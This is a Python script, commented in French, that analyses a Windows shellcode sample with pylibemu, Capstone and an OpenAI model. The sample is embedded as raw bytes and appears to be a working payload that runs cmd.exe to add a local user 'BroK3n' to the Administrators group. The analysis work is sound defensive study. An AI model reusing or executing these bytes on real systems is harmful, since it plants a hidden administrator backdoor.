import pylibemu
import openai
import os
import re
from capstone import Cs, CS_ARCH_X86, CS_MODE_32
from dotenv import load_dotenv

# variable .env (clé openai)
load_dotenv()
openai.api_key = os.getenv("OPENAI_API_KEY")

# shellcode moyen
shellcode = (
    b"\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c"
    b"\x33\x75\xf2\x89\xc7\x03\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b\x34\xaf\x01"
    b"\xc6\x45\x81\x3e\x57\x69\x6e\x45\x75\xf2\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7"
    b"\x8b\x7c\xaf\xfc\x01\xc7\x68\x4b\x33\x6e\x01\x68\x20\x42\x72\x6f\x68\x2f\x41\x44\x44\x68\x6f\x72"
    b"\x73\x20\x68\x74\x72\x61\x74\x68\x69\x6e\x69\x73\x68\x20\x41\x64\x6d\x68\x72\x6f\x75\x70\x68\x63"
    b"\x61\x6c\x67\x68\x74\x20\x6c\x6f\x68\x26\x20\x6e\x65\x68\x44\x44\x20\x26\x68\x6e\x20\x2f\x41\x68"
    b"\x72\x6f\x4b\x33\x68\x33\x6e\x20\x42\x68\x42\x72\x6f\x4b\x68\x73\x65\x72\x20\x68\x65\x74\x20\x75"
    b"\x68\x2f\x63\x20\x6e\x68\x65\x78\x65\x20\x68\x63\x6d\x64\x2e\x89\xe5\xfe\x4d\x53\x31\xc0\x50\x55"
    b"\xff\xd7"
)


# les chaînes lisibles du shellcode
def get_shellcode_strings(shellcode):
    return [s.decode("utf-8", errors="ignore") for s in re.findall(rb"[\x20-\x7e]{4,}", shellcode)]


# test avec pylibemu
def get_pylibemu_analysis(shellcode):
    emu = pylibemu.Emulator()
    offset = emu.shellcode_getpc_test(shellcode)
    if offset < 0:
        offset = 0
    emu.prepare(shellcode, offset)
    emu.test()
    return emu.emu_profile_output.decode(errors="ignore")


# désassemblage avec capstone pour voir les instructions asm
def get_capstone_analysis(shellcode):
    disas = Cs(CS_ARCH_X86, CS_MODE_32)
    result = []
    for i in disas.disasm(shellcode, 0x1000):
        result.append(f"{i.address:08x}:\t{i.mnemonic}\t{i.op_str}")
    return "\n".join(result)


# analyse avec chatgpt4.1 nano
def get_llm_analysis(profile):
    try:
        rep = openai.ChatCompletion.create(
            model="gpt-4.1-nano-2025-04-14",
            messages=[
                {
                    "role": "system",
                    "content": "Tu es un expert en cybersécurité. Analyse ce shellcode brièvement en 2-3 paragraphes.",
                },
                {"role": "user", "content": profile},
            ],
            temperature=0.3,
        )
        return rep["choices"][0]["message"]["content"]
    except Exception as e:
        return f"Erreur avec GPT : {e}"


# affichage
print("\n>> chaînes trouvées dans le shellcode :\n")
for s in get_shellcode_strings(shellcode):
    print("-", s)

print("\n>> pylibemu :\n")
p = get_pylibemu_analysis(shellcode)
print(p)

print("\n>> désassemblage capstone :\n")
print(get_capstone_analysis(shellcode))

print("\n>> chatgpt4.1 :\n")
print(get_llm_analysis(p))
